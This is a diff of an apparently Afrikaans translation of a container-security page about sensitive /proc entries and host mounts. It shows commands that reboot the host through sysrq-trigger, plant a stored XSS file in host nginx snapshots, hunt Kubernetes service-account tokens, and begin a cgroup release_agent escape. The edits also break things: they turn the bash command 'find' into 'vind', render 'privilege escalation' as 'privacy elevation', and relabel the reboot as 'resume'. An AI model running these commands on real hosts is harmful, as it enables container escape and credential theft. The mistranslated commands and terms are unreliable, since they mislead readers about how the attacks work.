@@ -40,7 +40,7 @@ return 0;
 #### **`/proc/sys/kernel/modprobe`**
 
 - Gedetailleerd in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Bevat die pad na die kernmodule-laaier, wat aangeroep word om kernmodules te laai.
+- Bevat die pad na die kernmodule laaier, wat aangeroep word om kernmodules te laai.
 - **Toegang Kontrole Voorbeeld**:
 
 ```bash
@@ -49,18 +49,18 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Verwys na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- 'n Globale vlag wat beheer of die kern paniek of die OOM-killer aanroep wanneer 'n OOM-toestand voorkom.
+- Verwys in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- 'n Globale vlag wat beheer of die kern paniek of die OOM killer aanroep wanneer 'n OOM toestand voorkom.
 
 #### **`/proc/sys/fs`**
 
 - Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
-- Skryftoegang kan verskeie ontkenning-van-diens-aanvalle teen die gasheer moontlik maak.
+- Skryftoegang kan verskeie ontkenning-van-diens aanvalle teen die gasheer moontlik maak.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Laat registrasie van interprete vir nie-inheemse binêre formate gebaseer op hul magiese nommer toe.
-- Kan lei tot privilige-eskalasie of root shell toegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
+- Kan lei tot privaatheidsverhoging of root shell toegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
 - Betrokke uitbuiting en verduideliking:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
@@ -78,17 +78,17 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 - **Hervatting van Gasheer Voorbeeld**:
 
 ```bash
-echo b > /proc/sysrq-trigger # Herlaai die gasheer
+echo b > /proc/sysrq-trigger # Hervat die gasheer
 ```
 
 #### **`/proc/kmsg`**
 
-- Stel kernringbufferboodskappe bloot.
+- Stel kernringbuffer boodskappe bloot.
 - Kan help met kernuitbuitings, adreslekke, en sensitiewe stelselinligting verskaf.
 
 #### **`/proc/kallsyms`**
 
-- Lys kerngeëksporteerde simbole en hul adresse.
+- Lys kern geëksporteerde simbole en hul adresse.
 - Essensieel vir kernuitbuiting ontwikkeling, veral om KASLR te oorkom.
 - Adresinligting is beperk met `kptr_restrict` op `1` of `2` gestel.
 - Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -96,7 +96,7 @@ echo b > /proc/sysrq-trigger # Herlaai die gasheer
 #### **`/proc/[pid]/mem`**
 
 - Interfacing met die kern geheue toestel `/dev/mem`.
-- Histories kwesbaar vir privilige-eskalasie aanvalle.
+- Histories kwesbaar vir privaatheidsverhoging aanvalle.
 - Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
@@ -109,7 +109,7 @@ echo b > /proc/sysrq-trigger # Herlaai die gasheer
 #### **`/proc/kmem`**
 
 - Alternatiewe interfacing vir `/dev/kmem`, wat kern virtuele geheue verteenwoordig.
-- Laat lees en skryf toe, en dus direkte wysiging van kern geheue.
+- Laat lees en skryf toe, dus direkte wysiging van kern geheue.
 
 #### **`/proc/mem`**
 
@@ -231,8 +231,7 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Gestoor XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="af"><head><script>alert("Gestoor XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
 
 The XSS was achieved:
@@ -249,7 +248,7 @@ The container can read K8s serviceaccount tokens or AWS webidentity tokens
 which allows the container to gain unauthorized access to K8s or cloud:
 
 ```bash
-/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/ # vind /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
 <SNIP>
 /host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
@@ -294,7 +293,7 @@ Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent 
 ```text
 /run/containerd/containerd.sock     # containerd CRI-soket  
 /var/run/crio/crio.sock             # CRI-O runtime-soket  
-/run/podman/podman.sock             # Podman API (rootful of rootloos)  
+/run/podman/podman.sock             # Podman API (rootful of rootless)  
 /run/buildkit/buildkitd.sock        # BuildKit daemon (rootful)  
 /var/run/kubelet.sock               # Kubelet API op Kubernetes-knope  
 /run/firecracker-containerd.sock    # Kata / Firecracker
@@ -315,7 +314,7 @@ A similar technique works with **crictl**, **podman** or the **kubelet** API onc
 Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
 
 ```bash
-# aanneem dat die houer CAP_SYS_ADMIN het en 'n kwesbare kern
+# aannemende dat die houer CAP_SYS_ADMIN het en 'n kwesbare kern
 mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # vereis CVE-2022-0492
